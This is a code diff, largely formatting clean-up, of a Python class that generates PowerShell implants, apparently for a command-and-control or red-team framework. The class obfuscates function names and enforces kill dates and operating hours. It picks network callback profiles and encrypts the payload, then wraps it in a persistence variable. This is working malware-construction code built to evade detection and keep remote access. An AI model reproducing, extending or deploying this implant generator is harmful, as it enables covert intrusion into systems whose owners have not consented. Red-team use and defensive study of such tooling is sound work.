@@ -9,7 +9,6 @@ from Implant.payload_encryption import PayloadEncryption
 from NetworkProfiles.NetworkProfileManager import NetworkProfileManager
 
 
-
 class ImplantGenerator:
     # ImplantGenerator has a single public method (generate_implant_from_template)
     #   which is used to generate a new active implant in the event of a stager
@@ -91,23 +90,19 @@ function {{ ron.obf_kill_date }}{
 '''
     operating_hours = '''
 function {{ ron.obf_operating_hours }}(){
-    #Write-host "Are we at working time yet?"
     while ($true){
         $start_string = "{{ operating_hours['oh_start'] }}:00"
         $stop_string =  "{{ operating_hours['oh_stop'] }}:00"
         $start = [datetime]::parseexact($start_string, 'HH:mm:ss', $null)
         $stop = [datetime]::parseexact($stop_string, 'HH:mm:ss', $null)
-    
         if ($start -lt $stop){
-            #Write-Host "9-5"
             if( ( (get-date) -ge $start ) -And ((get-date) -le $stop) ){  
             return }
         } else {
             $stop = $stop.AddDays(1)
-            # Write-Host "5-9"
-            # Write-Host $stop
-            if ( ((get-date) -lt $stop) -And ( (Get-Date) -gt $start ) ) { 
-            return}
+            if ( ((get-date) -lt $stop) -And ((Get-Date) -gt $start ) ) { 
+                return
+            }
         }
         start-sleep(3);
     }
@@ -187,7 +182,6 @@ while($true){
         implant_functions = self.ImpFunc.get_list_of_implant_text()
         implant_functions.extend(core_implant_functions)
 
-
         ports = {}
         network_profile_functions = {}
         for profile_name in implant_data['network_profiles']:
@@ -220,7 +214,6 @@ while($true){
             protocol_string += f"     {proto_count} {{ {network_profile_functions[net_prof]}($plh) }}\n"
             proto_count += 1
 
-
         f_str = f"switch ( {randomised_function_names['obf_select_protocol']}({proto_count})) {{" \
                 f"\n{protocol_string}" \
                 f"\n}}"
@@ -228,20 +221,19 @@ while($true){
         return constructed_implant, f_str, ports
 
     def _encrypt_and_wrap_payload(self, implant_config, payload):
-            # Check if encryption is needed:
-            persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
+        # Check if encryption is needed:
+        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
 
-            for encryption_mode in implant_config['encryption']:
-                if encryption_mode == "static_encryption":
-                    payload = self.StaticEnc.payload_encryption(payload)
+        for encryption_mode in implant_config['encryption']:
+            if encryption_mode == "static_encryption":
+                payload = self.StaticEnc.payload_encryption(payload)
 
-            # Once the payload is encrypted (or not), it will be wrapped with the persistence variable at
-            # the top of the file. This ensure that the encrypted payload is in persistence mechanisms.
-            constructor = f"""{persistence_variable}
-    {payload}
-    """
-            return constructor
-
+        # Once the payload is encrypted (or not), it will be wrapped with the persistence variable at
+        # the top of the file. This ensure that the encrypted payload is in persistence mechanisms.
+        constructor = f"""{persistence_variable}
+{payload}
+"""
+        return constructor
 
     def generate_implant_from_template(self, implant_data):
         """
@@ -259,7 +251,6 @@ while($true){
         # Collect the modules strings - these variables are to be used as function names internally.
         unobfuscated_modules_string = self.ImpFunc.get_obfucation_string_dict()
         obfuscated_modules_string = self._function_name_obfuscation(implant_data, unobfuscated_modules_string)
-
 
         callback_url = implant_data['callback_url']
         variable_list = ""
@@ -289,8 +280,3 @@ while($true){
         unencrypted_implant = f"function {func_name}{{ {output_from_parsed_template} }};{func_name}"
         finalised_implant = self._encrypt_and_wrap_payload(implant_data, unencrypted_implant)
         return finalised_implant, unencrypted_implant
-
-
-
-
-
